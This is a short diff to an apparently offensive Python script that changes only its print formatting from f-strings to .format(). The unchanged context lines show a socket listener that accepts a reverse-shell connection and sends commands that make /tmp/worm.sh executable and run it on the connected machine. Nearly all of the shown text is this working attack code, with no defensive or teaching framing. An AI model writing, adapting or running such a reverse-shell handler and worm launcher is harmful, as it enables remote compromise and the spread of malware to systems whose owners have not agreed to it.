@@ -11,7 +11,7 @@ shell_commands = (
     "; sleep 3; chmod +x /tmp/worm.sh; /tmp/worm.sh\n"
 )
 
-print(f"[+] Listening on port {port}...")
+print("[+] Listening on port {}...".format(port))
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -19,7 +19,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.listen(1)
 
     client_conn, client_addr = sock.accept()
-    print(f"[+] Connection from {client_addr[0]}:{client_addr[1]}")
+    print("[+] Connection from {}:{}".format(client_addr[0], client_addr[1]))
     with client_conn:
         print("[+] Sending commands to reverse shell...")
         client_conn.sendall(shell_commands.encode())
